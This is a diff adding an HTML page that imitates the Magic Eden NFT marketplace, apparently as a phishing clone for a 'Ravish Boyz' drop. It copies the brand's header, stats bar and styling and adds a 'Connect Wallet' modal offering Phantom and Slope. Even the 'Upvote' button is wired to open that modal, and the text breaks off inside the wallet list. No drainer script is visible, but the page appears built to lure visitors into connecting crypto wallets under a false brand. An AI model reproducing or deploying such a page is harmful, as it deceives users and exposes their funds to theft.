@@ -1,0 +1,1355 @@
+<html lang="en" class="md:tw-overflow-y-auto">
+    <head>
+        <meta charset="utf-8" />
+        <link rel="icon" href="images/favicon.png" type="image/png" data-react-helmet="true" />
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
+        <meta name="theme-color" content="#000000" data-react-helmet="true" />
+        <meta name="description" content="Magic Eden - NFT Marketplace" data-react-helmet="true" />
+        <meta content="Magic Eden - NFT Marketplace" property="og:site_name" />
+        <meta content="https://magiceden.io/drops/ravishboyz" property="og:title" />
+        <meta
+            content="
+   Magic Eden is the leading NFT Marketplace on Solana. Home to the next generation of digital creators. Discover the best and latest Solana NFT collections.
+    "
+            property="og:description"
+        />
+        <meta content="https://cryptocurrencyjobs.co/startups/assets/logos/magic-eden.png" property="og:image" />
+        <meta name="twitter:card" content="summary_large_image" />
+        <link type="application/json+oembed" href="embed-pixelinvaderz.json" />
+        <meta name="theme-color" content="#7289DA" />
+        <link rel="android-touch-icon" href="images/logo.png" />
+        <link rel="apple-touch-icon" href="images/logo.png" />
+        <link rel="manifest" href="manifest.json" />
+        <link
+            href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.1.1/css/bootstrap.min.css"
+            rel="stylesheet"
+            integrity="sha512-6KY5s6UI5J7SVYuZB4S/CZMyPylqyyNZco376NM2Z8Sb8OxEdp02e1jkKk/wZxIEmjQ6DRCEBhni+gpr9c4tvA=="
+            crossorigin="anonymous"
+        />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet" />
+        <title>Magic Eden - NFT Marketplace</title>
+        <link href="static/css/2.1cb76956.chunk.css" rel="stylesheet" />
+        <link href="static/css/main.f45bd46a.chunk.css" rel="stylesheet" />
+
+        <!--- <link href="static/css/2.6abd1902.chunk.css" rel="stylesheet"> --->
+
+        <style type="text/css">
+            .qqq {
+                color: #d3d3d3 !important;
+            }
+
+            .mintBtn {
+                z-index: 9999;
+                padding: 1px !important;
+                align-items: center !important;
+                justify-content: center !important;
+                width: 300px !important;
+                height: 42px !important;
+                background: #e42575 !important;
+                border-radius: 6px !important;
+                background-image: #e42575 !important;
+                font-family: ui-sans-serif, system-ui !important;
+                color: #d3d3d3 !important;
+            }
+
+            .styles-module_wrapper__1I_qj {
+                z-index: 1;
+                display: flex;
+                align-items: center;
+                position: fixed;
+                padding: 0px 60px 0px 60px;
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                background-color: black;
+                box-sizing: border-box;
+            }
+
+            .styles-module_content__2jwZj {
+                margin: auto;
+                padding: 0;
+                width: 90%;
+                height: 100%;
+                max-height: 100%;
+                text-align: center;
+            }
+
+            .styles-module_slide__1zrfk {
+                height: 100%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .styles-module_image__2hdkJ {
+                max-height: 100%;
+                max-width: 100%;
+                user-select: none;
+                -moz-user-select: none;
+                -webkit-user-select: none;
+            }
+
+            .styles-module_close__2I1sI {
+                color: white;
+                position: absolute;
+                top: 15px;
+                right: 15px;
+                font-size: 40px;
+                font-weight: bold;
+                opacity: 0.2;
+                cursor: pointer;
+            }
+
+            .styles-module_close__2I1sI:hover {
+                opacity: 1;
+            }
+
+            .styles-module_navigation__1pqAE {
+                height: 80%;
+                color: white;
+                cursor: pointer;
+                position: absolute;
+                font-size: 60px;
+                line-height: 60px;
+                font-weight: bold;
+                display: flex;
+                align-items: center;
+                opacity: 0.2;
+                padding: 0 15px;
+                user-select: none;
+                -moz-user-select: none;
+                -webkit-user-select: none;
+            }
+
+            .styles-module_navigation__1pqAE:hover {
+                opacity: 1;
+            }
+
+            @media (hover: none) {
+                .styles-module_navigation__1pqAE:hover {
+                    opacity: 0.2;
+                }
+            }
+
+            .styles-module_prev__KqFRp {
+                left: 0;
+            }
+
+            .styles-module_next__1uQwZ {
+                right: 0;
+            }
+
+            @media (max-width: 900px) {
+                .styles-module_wrapper__1I_qj {
+                    padding: 0;
+                }
+            }
+
+            .header__search {
+                position: relative;
+                width: 672px;
+                margin-right: 30px;
+                height: 36px;
+            }
+
+            @media screen and (max-width: 1200px) {
+                .header__search {
+                    width: 250px;
+                    margin-right: 20px;
+                }
+            }
+
+            @media screen and (max-width: 991px) {
+                .header__search {
+                    display: none;
+                }
+            }
+
+            .header__block {
+                display: flex;
+                align-items: center;
+            }
+
+            .header__search input {
+                background: #0b090f !important;
+                border: 1px solid #473f66;
+                box-sizing: border-box;
+                padding: 0 12px;
+                border-radius: 5px;
+                width: 100%;
+                color: #fff !important;
+                height: 100%;
+                font-size: 12px;
+            }
+
+            .header__search :hover {
+                border: 1px solid #58507c;
+            }
+
+            .header__search input::placeholder {
+                color: #6f6d72;
+            }
+
+            .header__search button {
+                position: absolute;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                background: none;
+                cursor: pointer;
+                border: 0;
+                right: 10px;
+                top: 50%;
+                transform: translate(0, -50%);
+                pointer-events: none;
+            }
+
+            .tw-my-4 {
+                margin-top: 1rem;
+                margin-bottom: 1rem;
+            }
+
+            .tippy-popper {
+                display: none;
+            }
+
+            .svgqq:hover .tippy-popper {
+                display: flex !important;
+            }
+
+            .accordion-body,
+            .accordion-button {
+                border: none !important;
+                border-radius: 6px !important;
+            }
+
+            .accordion-button:after,
+            .accordion-button:focus:after {
+                background-image: url("images/CLOSESVG.svg") !important;
+                filter: invert(67%) sepia(0%) saturate(2195%) hue-rotate(316deg) brightness(94%) contrast(74%);
+                background-size: 12px 8px;
+                background-position: center center;
+                margin-left: 196px;
+            }
+
+            .accordion,
+            .accordion-header,
+            .accordion-item {
+                background-color: #2c2d30 !important;
+            }
+
+            .wallet-adapter-modal-container {
+                display: flex;
+                margin: 0;
+                height: 100%;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .wallet-adapter-modal-wrapper {
+                box-sizing: border-box;
+                position: relative;
+                display: flex;
+                align-items: center;
+                flex-direction: column;
+                z-index: 1050;
+                max-width: 400px;
+                border-radius: 10px;
+                background: #2c2d30;
+                box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+                font-family: "Inter", "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+                font-weight: 600;
+                padding: 40px 20px 20px;
+                flex: 1 1;
+            }
+            .wallet-adapter-modal-wrapper .wallet-adapter-modal-logo-wrapper {
+                box-sizing: border-box;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                height: 90px;
+                width: 90px;
+                border-radius: 50%;
+                background: #141515;
+                margin-bottom: 10px;
+                padding: 12px;
+            }
+            .wallet-adapter-modal-wrapper .wallet-adapter-modal-title {
+                font-weight: 600;
+                font-size: 34px;
+                line-height: 41px;
+                margin-bottom: 27px;
+                margin-top: 0;
+                width: 100%;
+                text-align: center;
+                color: #fff;
+            }
+            .wallet-adapter-modal-wrapper .wallet-adapter-modal-list {
+                margin: 0 0px 0px;
+                padding: 0px 00px;
+                width: 100%;
+                list-style: none;
+            }
+            .wallet-adapter-modal-wrapper .wallet-adapter-button {
+                background-color: #404144;
+                border: none !important;
+                border-radius: 6px;
+                color: #fff;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                font-family: "Inter", "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+                font-size: 16px;
+                font-weight: 600;
+                height: 50px;
+                line-height: 50px;
+                padding: 0 20px;
+                width: 100%;
+                margin-top: 12px;
+            }
+            .wallet-adapter-button:hover {
+                background-color: #36373a;
+            }
+            .wallet-adapter-modal-wrapper .wallet-adapter-collapse {
+                width: 100%;
+                height: 0px;
+                overflow: hidden;
+                transition: height 250ms ease-out 0s;
+            }
+            .wallet-adapter-modal-wrapper .wallet-adapter-button-end-icon {
+                align-self: center;
+                fill: #999;
+            }
+            .wallet-adapter-modal-wrapper .wallet-adapter-button-end-icon {
+                margin-left: 8px;
+            }
+            .wallet-adapter-modal-wrapper .wallet-adapter-modal-button-close {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                padding: 10px;
+                cursor: pointer;
+                background: none;
+                border: none;
+                border-radius: 6px;
+                transition: fill 0.2s ease 0s;
+                fill: #777;
+            }
+            .wallet-adapter-modal-button-close:hover {
+                fill: #fff;
+                transition: fill 0.2s ease 0s;
+            }
+
+            .modal-content {
+                background: transparent;
+                border-radius: 0;
+                border: none;
+                outline: none;
+                display: flex;
+                flex-direction: column;
+            }
+
+            .wallet-adapter-button {
+                background-color: #404144;
+                border: none;
+                border-radius: 6px;
+                color: #fff;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                font-family: "Inter", "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+                font-size: 16px;
+                font-weight: 600;
+                height: 50px;
+                line-height: 50px;
+                padding: 0 20px;
+            }
+
+            .wallet-adapter-button-trigger {
+                background-color: #4e44ce;
+            }
+
+            .wallet-adapter-button:not([disabled]):focus-visible {
+                outline-color: #fff;
+            }
+
+            .wallet-adapter-button:not([disabled]):hover {
+                background-image: linear-gradient(rgba(0, 0, 0, 0.15) 0 0);
+            }
+
+            .wallet-adapter-button[disabled] {
+                background: #404144;
+                color: #999;
+                cursor: not-allowed;
+            }
+
+            .wallet-adapter-button-end-icon,
+            .wallet-adapter-button-end-icon img,
+            .wallet-adapter-button-start-icon,
+            .wallet-adapter-button-start-icon img {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                width: 24px;
+                height: 24px;
+            }
+
+            .wallet-adapter-button-end-icon {
+                margin-left: 8px;
+            }
+
+            .wallet-adapter-button-start-icon {
+                margin-right: 8px;
+            }
+
+            .wallet-adapter-collapse {
+                width: 100%;
+            }
+
+            .wallet-adapter-dropdown {
+                position: relative;
+                display: inline-block;
+            }
+
+            .wallet-adapter-dropdown-list {
+                position: absolute;
+                z-index: 99;
+                display: grid;
+                grid-template-rows: 1fr;
+                grid-row-gap: 10px;
+                padding: 10px;
+                top: 100%;
+                right: 0;
+                margin: 0;
+                list-style: none;
+                background: #2c2d30;
+                border-radius: 10px;
+                box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+                opacity: 0;
+                visibility: hidden;
+                transition: opacity 0.2s ease, transform 0.2s ease, visibility 0.2s;
+            }
+
+            .wallet-adapter-dropdown-list-active {
+                opacity: 1;
+                visibility: visible;
+                transform: translateY(10px);
+            }
+
+            .wallet-adapter-dropdown-list-item {
+                background: #404144;
+                display: flex;
+                flex-direction: row;
+                justify-content: center;
+                align-items: center;
+                border: none;
+                outline: none;
+                cursor: pointer;
+                white-space: nowrap;
+                box-sizing: border-box;
+                padding: 0 20px;
+                width: 100%;
+                border-radius: 6px;
+                font-size: 14px;
+                font-weight: 600;
+                height: 37px;
+                color: #fff;
+            }
+
+            .wallet-adapter-dropdown-list-item:not([disabled]):hover {
+                background-image: linear-gradient(rgba(0, 0, 0, 0.15) 0 0);
+            }
+
+            .wallet-adapter-modal-collapse-button svg {
+                align-self: center;
+                fill: #999;
+            }
+
+            .wallet-adapter-modal-collapse-button.wallet-adapter-modal-collapse-button-active svg {
+                transform: rotate(180deg);
+                transition: transform 0.15s ease-in;
+            }
+
+            .wallet-adapter-modal {
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                opacity: 0;
+                transition: opacity 0.15s linear !important;
+                background: rgba(0, 0, 0, 0.5);
+                z-index: 1040;
+                overflow-y: auto;
+            }
+
+            .wallet-adapter-modal.wallet-adapter-modal-fade-in {
+                opacity: 1;
+            }
+
+            .wallet-adapter-modal-button-close {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                padding: 10px;
+                cursor: pointer;
+                background: none;
+                border: none;
+                border-radius: 6px;
+            }
+
+            .wallet-adapter-modal-button-close:focus-visible {
+                outline-color: #fff;
+            }
+
+            .wallet-adapter-modal-button-close svg {
+                fill: #777;
+                transition: fill 0.2s ease 0s;
+            }
+
+            .wallet-adapter-modal-button-close:hover svg {
+                fill: #fff;
+            }
+
+            .wallet-adapter-modal-logo {
+                max-width: 100%;
+            }
+
+            .wallet-adapter-modal-logo-wrapper {
+                box-sizing: border-box;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                height: 90px;
+                width: 90px;
+                border-radius: 50%;
+                background: #141515;
+                margin-bottom: 10px;
+                padding: 12px;
+            }
+
+            .wallet-adapter-modal-overlay {
+                background: rgba(0, 0, 0, 0.5);
+                position: fixed;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                right: 0;
+            }
+
+            .modal.fade .modal-dialog {
+                transition: none !important;
+                transform: none !important;
+            }
+            @media (min-width: 576px) {
+                .modal-dialog {
+                    max-width: 100%;
+                    margin: 0rem auto;
+                    align-items: center;
+                }
+            }
+
+            @media (max-width: 480px) {
+                .wallet-adapter-modal-container {
+                    margin: 0rem;
+                    min-height: 100%;
+                }
+            }
+
+            .wallet-adapter-modal-wrapper {
+                box-sizing: border-box;
+                position: relative;
+                display: flex;
+                align-items: center;
+                flex-direction: column;
+                z-index: 1050;
+                max-width: 400px;
+                border-radius: 10px;
+                background: #2c2d30;
+                box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+                font-family: "Inter", "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+                font-weight: 600;
+                padding: 40px 20px 20px;
+                flex: 1 1;
+            }
+
+            .wallet-adapter-modal-wrapper .wallet-adapter-button {
+                width: 100%;
+            }
+
+            .wallet-adapter-modal-wrapper-no-logo {
+                padding-top: 30px;
+            }
+
+            .wallet-adapter-modal-title {
+                font-weight: 600;
+                font-size: 34px;
+                line-height: 41px;
+                margin-bottom: 27px;
+                margin-top: 0;
+                width: 100%;
+                text-align: center;
+                color: #fff;
+            }
+
+            @media (max-width: 374px) {
+                .wallet-adapter-modal-title {
+                    font-size: 26px;
+                }
+            }
+
+            .wallet-adapter-modal-list {
+                margin: 0 0 12px;
+                padding: 0;
+                width: 100%;
+                list-style: none;
+            }
+
+            .wallet-adapter-modal-list li:not(:first-of-type) {
+                margin-top: 12px;
+            }
+        </style>
+        <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=UA-213621249-1"></script>
+        <style></style>
+        <style></style>
+        <style data-emotion="css" data-s=""></style>
+    </head>
+
+    <body style="overflow: visible;">
+        <noscript>You need to enable JavaScript to run this app.</noscript>
+        <div id="banner">
+            <div></div>
+        </div>
+        <div>
+            <div>
+                <div>
+                    <div class="main page launch-pad-page">
+                        <div class="tw-w-full tw-flex tw-bg-gray-200 tw-z-50 tw-px-4">
+                            <div class="tw-hidden sm:tw-flex tw-flex-auto tw-justify-center" style="height: 32px; display: flex; align-items: center; padding-bottom: 1px;">
+                                <ul class="tw-flex tw-justify-center">
+                                    <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap">
+                                        <span class="tw-text-gray2-500" style="font-size: 12px;">Volume 24h:&nbsp;&nbsp;</span><span class="tw-text-pink-primary" style="font-size: 12px;"> 119,536 SOL</span>
+                                    </li>
+
+                                    <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap">
+                                        <span class="tw-text-gray2-500" style="font-size: 12px; padding-left: 0px;">Volume total:&nbsp;&nbsp;</span>
+                                        <span class="tw-text-pink-primary" style="font-size: 12px; padding-right: 10px;">20,628,290 SOL</span>
+                                    </li>
+                                    <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap">
+                                        <span class="tw-text-gray2-500" style="font-size: 12px; padding-left: 0px;">SOL/USD&nbsp;&nbsp;</span><span class="tw-text-pink-primary" style="font-size: 12px; padding-right: 10px;"> $42.74</span>
+                                    </li>
+                                    <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap">
+                                        <span class="tw-text-gray2-500" style="font-size: 12px; padding-left: 0px;">Solana Network&nbsp;&nbsp;</span>
+                                        <span class="tw-text-pink-primary" style="font-size: 12px; padding-right: 10px;">2,457 TPS</span>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="tw-flex tw-items-center tw-ml-auto tw-flex-shrink-0">
+                                <div class="me-dropdown-container">
+                                    <div class="cursor-pointer position-relative">
+                                        <button role="button" class="tw-flex tw-items-center">
+                                            <span class="tw-text-xs">English</span>
+                                            <span class="tw-ml-1">
+                                                <svg
+                                                    stroke="currentColor"
+                                                    fill="none"
+                                                    stroke-width="2"
+                                                    viewBox="0 0 24 24"
+                                                    stroke-linecap="round"
+                                                    stroke-linejoin="round"
+                                                    color="#f8f7f8"
+                                                    height="0.75rem"
+                                                    width="0.75rem"
+                                                    xmlns="http://www.w3.org/2000/svg"
+                                                    style="color: rgb(248, 247, 248);"
+                                                >
+                                                    <polyline points="6 9 12 15 18 9"></polyline>
+                                                </svg>
+                                            </span>
+                                        </button>
+                                    </div>
+                                    <div
+                                        aria-label="dropdown-list"
+                                        class="dropdown tw-text-secondary"
+                                        style="position: absolute; left: 0px; top: 0px; width: fit-content; right: auto; bottom: auto; transform: translate(1261px, 28px);"
+                                        data-popper-reference-hidden="false"
+                                        data-popper-escaped="false"
+                                        data-popper-placement="bottom-start"
+                                    >
+                                        <ul class="tw-py-2 tw-px-3 tw-text-white-1">
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">English</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">한국어</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">日本語</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">Türkçe</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="tw-border-soft tw-border-b tw-border-solid">Tiếng Việt</div>
+                                            </li>
+                                            <li class="tw-cursor-pointer">
+                                                <div class="">Русский</div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <header class="tw-bg-gray-100 tw-px-4 tw-w-full tw-h-80px tw-flex tw-sticky tw-top-0 tw-z-30">
+                            <nav class="navbar tw-w-full tw-flex">
+                                <div class="tw-flex tw-flex-auto tw-items-center">
+                                    <div class="tw-flex tw-items-center">
+                                        <button class="tw-p-2 md:tw-p-4 hover:tw-bg-gray-500 tw-rounded-lg lg:tw-hidden HeaderV2_collapseBtn__2hjOo">
+                                            <svg
+                                                stroke="currentColor"
+                                                fill="currentColor"
+                                                stroke-width="0"
+                                                viewBox="0 0 448 512"
+                                                color="#f8f7f8"
+                                                height="1.5rem"
+                                                width="1.5rem"
+                                                xmlns="http://www.w3.org/2000/svg"
+                                                style="color: rgb(248, 247, 248);"
+                                            >
+                                                <path
+                                                    d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"
+                                                ></path>
+                                            </svg>
+                                        </button>
+                                        <a class="navbar-brand" href="http://magiceden.io"><img class="logo HeaderV2_logo__35dMv" src="static/media/logo.ca418d75.svg" alt="sticky brand-logo" /></a>
+                                    </div>
+                                    <div class="tw-flex-auto tw-px-2 tw-ml-8 tw-hidden lg:tw-inline-flex tw-justify-center">
+                                        <div class="nav-item--search-bar tw-w-full tw-max-w-2xl lg:tw-px-0 css-b62m3t-container">
+                                            <span id="react-select-2-live-region" class="css-7pg0cj-a11yText"></span><span aria-live="polite" aria-atomic="false" aria-relevant="additions text" class="css-7pg0cj-a11yText"></span>
+                                            <div class="header__search">
+                                                <input type="text" placeholder="Search Collections and Creators" nativecolor="" nativeopacity="" style="opacity: 1; color: rgb(9, 8, 13); background-color: rgb(255, 255, 255);" />
+                                                <button><img src="images/search.png" alt="" /></button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="tw-flex-shrink-0 tw-ml-auto tw-flex">
+                                    <div class="tw-block lg:tw-hidden tw-ml-2">
+                                        <button class="tw-w-10 tw-h-10 hover:tw-bg-gray-500 tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-transform active:tw-scale-90">
+                                            <svg
+                                                stroke="currentColor"
+                                                fill="none"
+                                                stroke-width="2"
+                                                viewBox="0 0 24 24"
+                                                stroke-linecap="round"
+                                                stroke-linejoin="round"
+                                                color="#f8f7f8"
+                                                height="24"
+                                                width="24"
+                                                xmlns="http://www.w3.org/2000/svg"
+                                                style="color: rgb(248, 247, 248);"
+                                            >
+                                                <circle cx="11" cy="11" r="8"></circle>
+                                                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                    <a class="tw-text-white-1 tw-flex tw-items-center tw-px-2 tw-rounded-md" href="https://www.magiceden.io/me" style="padding-right: 16px;">Sell</a>
+                                    <div class="tw-flex tw-items-center ButtonGroup_group__2mJyT">
+                                        <button class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0">
+                                            <a class="tw-flex tw-w-full" href="https://www.magiceden.io/me">
+                                                <span class="tw-px-2">
+                                                    <svg
+                                                        stroke="currentColor"
+                                                        fill="none"
+                                                        stroke-width="2"
+                                                        viewBox="0 0 24 24"
+                                                        stroke-linecap="round"
+                                                        stroke-linejoin="round"
+                                                        color="#B450F7"
+                                                        height="24"
+                                                        width="24"
+                                                        xmlns="http://www.w3.org/2000/svg"
+                                                        style="color: #e42575;"
+                                                    >
+                                                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                                        <circle cx="12" cy="7" r="4"></circle>
+                                                    </svg>
+                                                </span>
+                                            </a>
+                                        </button>
+                                        <button
+                                            class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0"
+                                            style="padding-right: 4px; padding-left: 4px;"
+                                            data-toggle="modal"
+                                            data-target="#exampleModal"
+                                        >
+                                            <div class="me-dropdown-container tw-h-full">
+                                                <div class="me-dropdown-container tw-h-full">
+                                                    <div class="cursor-pointer position-relative tw-h-full tw-flex tw-items-center tw-px-2" id="showcase__btn0" style="display: flex;">Select Wallet</div>
+                                                </div>
+                                            </div>
+                                        </button>
+                                    </div>
+                                </div>
+                            </nav>
+                        </header>
+                        <div class="tw-flex tw-w-full">
+                            <div class="tw-flex tw-w-full tw-flex-auto">
+                                <div class="tw-max-w-screen-3xl tw-mx-auto tw-my-4 tw-w-full tw-px-8">
+                                    <div class="tw-flex tw-flex-1 tw-flex-col-reverse md:tw-flex-row tw-mx-auto tw-gap-8 tw-justify-between">
+                                        <div class="tw-flex tw-flex-col tw-gap-4 tw-flex-grow md:tw-max-w-[40%]"></div>
+                                        <div id="content" class="tw-relative tw-flex tw-flex-col tw-flex-auto tw-ml-0 2xl:tw-flex 2xl:tw-items-center content__slim lg:tw-ml-80px">
+                                            <section>
+                                                <div class="container tw-mt-5 tw-pt-90px">
+                                                    <a href="http://magiceden.io/drops"><span class="hover:tw-opacity-80 tw-text-pink-hot">See all drops</span></a>
+                                                    <div class="tw-flex tw-flex-col-reverse md:tw-flex-row md:tw-gap-12 tw-justify-content-center tw-mt-4">
+                                                        <div class="tw-flex-1">
+                                                            <div class="tw-mt-4 lg:tw-mt-0 tw-rounded-xl">
+                                                             <h1 class="tw-text-5xl tw-font-extrabold tw-leading-tight">Ravish Boyz</h1>
+                                            <div class="tw-flex tw-text-sm text-white tw-mt-2">
+                                                <div class="" data-tooltipped="" aria-describedby="tippy-tooltip-1115" data-original-title="America/Los_Angeles" style="display: inline;">TBD</div>
+                                                <span class="tw-flex tw-items-center text-white tw-rounded-md tw-ml-4 tw-px-2 tw-bg-gray-200">new</span>
+                                            </div>
+                                            <div class="tw-flex tw-mt-4 tw-flex-wrap tw-gap-y-4">
+                                                <a
+                                                    href="https://twitter.com/RavishBoyz"
+                                                    target="_blank"
+                                                    rel="noreferrer noopener"
+                                                    class="tw-mr-4 tw-border tw-border-solid tw-border-purple-3 tw-flex tw-items-center tw-w-fit tw-rounded-full tw-px-2.5 tw-py-1.5 tw-text-white-2"
+                                                >
+                                                    <img class="tw-w-6" src="https://www.magiceden.io/static/media/globe_white.1cc8238d59c1be911999eabdeeb72b8c.svg" alt="social link" /><span class="tw-ml-2">website</span>
+                                                </a>
+                                                <a
+                                                    href="https://twitter.com/ravishboyz"
+                                                    target="_blank"
+                                                    rel="noreferrer noopener"
+                                                    class="tw-mr-4 tw-border tw-border-solid tw-border-purple-3 tw-flex tw-items-center tw-w-fit tw-rounded-full tw-px-2.5 tw-py-1.5 tw-text-white-2"
+                                                >
+                                                    <img class="tw-w-6" src="https://www.magiceden.io/static/media/twitter_white.646bf11eec160fc04b57653d5d95478b.svg" alt="social link" />
+                                                </a>
+                                                <a
+                                                    href="https://discord.gg/Nszmw3eftY"
+                                                    target="_blank"
+                                                    rel="noreferrer noopener"
+                                                    class="tw-mr-4 tw-border tw-border-solid tw-border-purple-3 tw-flex tw-items-center tw-w-fit tw-rounded-full tw-px-2.5 tw-py-1.5 tw-text-white-2"
+                                                >
+                                                    <img class="tw-w-6" src="https://www.magiceden.io/static/media/discord_white.a80cd7b6a598d458f12090e4f0316953.svg" alt="social link" />
+                                                </a>
+
+                                                                    <div class="" data-tooltipped="" aria-describedby="tippy-tooltip-54" data-original-title="upvote" style="display: inline;">
+                                                                        <button
+                                                                            type="button" class="tw-flex tw-gap-2 tw-items-center tw-px-4 tw-py-2 tw-border tw-rounded-lg tw-border-solid UpVote_btnSmall__gz6gC tw-border tw-border-gray-700"
+                                                                            style="width: "0";" data-toggle="modal" data-target="#exampleModal" id="WalletButton" >
+                                                                            <span>
+                                                                                <svg stroke-width="0" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" stroke="#e42575" fill="#4D3D5C" width="1rem" height="1rem">
+                                                                                    <path
+                                                                                        d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"
+                                                                                    ></path>
+                                                                                </svg>
+                                                                            </span>
+                                                                            <span>1240</span><span>Upvote</span>
+                                                                        </button>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="tw-my-6 tw-break-words tw-text-gray-3">
+                                                                    
+                                  Problem Solving Utility.<br><br> Bewildering Community.<br><br>Real Dividends. 
+
+
+                                                                </div>
+                                                            </div>
+                                                            <div class="md:tw-mt-12"></div>
+                                                            <div class="md:tw-mt-12"></div>
+                                                        </div>
+                                                        <div class="tw-flex-1">
+                                                            <div class="tw-flex tw-justify-center tw-items-center tw-rounded-md tw-overflow-hidden tw-w-full">
+                                                                <img
+                                                                    draggable="false"
+                                                                    loading="lazy"
+                                                                    
+                                                src="https://pbs.twimg.com/profile_images/1554953630909857793/5CqAd1sC_400x400.jpg"
+                                                alt="ravishboyz"
+
+                                                                    style="background-color: transparent;"
+                                                                />
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </section>
+                                            <div class="tw-flex tw-justify-between tw-gap-6 tw-w-full"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class=""><div class="tw-w-full tw-h-[1px] tw-border tw-border-solid tw-border-purple-1 tw-mt-12 tw-mb-4 lg:tw-mt-32 lg:tw-mb-10"></div></div>
+                            </div>
+
+                            <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                                <div class="modal-dialog modal-dialog-centered" role="document">
+                                    <div class="modal-content">
+                                        <div aria-labelledby="wallet-adapter-modal-title" aria-modal="true" class="wallet-adapter-modal wallet-adapter-modal-fade-in" role="dialog">
+                                            <div class="wallet-adapter-modal-container">
+                                                <div class="wallet-adapter-modal-wrapper false" id="wallet-adapter-modal-wrapper">
+                                                    <div class="wallet-adapter-modal-logo-wrapper">
+                                                        <img alt="logo" class="wallet-adapter-modal-logo" src="images/ME_LOGO.png" height="66" width="66" />
+                                                    </div>
+                                                    <h1 class="wallet-adapter-modal-title" id="wallet-adapter-modal-title">Connect Wallet</h1>
+                                                    <button class="wallet-adapter-modal-button-close" data-dismiss="modal">
+                                                        <svg width="14" height="14">
+                                                            <path d="M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z"></path>
+                                                        </svg>
+                                                    </button>
+
+                                                    <ul class="wallet-adapter-modal-list">
+                                                        <li>
+                                                            <button class="wallet-adapter-button" tabindex="0" type="button" style="justify-content: space-between; margin-top: 8;" id="Phantom_Connect" data-dismiss="modal">
+                                                                Phantom
+                                                                <span><img src="images/BTN_PHANTOM.svg" alt="Phantom icon" height="24" width="24" /></span>
+                                                            </button>
+                                                        </li>
+                                                        <li>
+                                                            <button class="wallet-adapter-button" tabindex="0" type="button" style="justify-content: space-between;">
+                                                                Slope
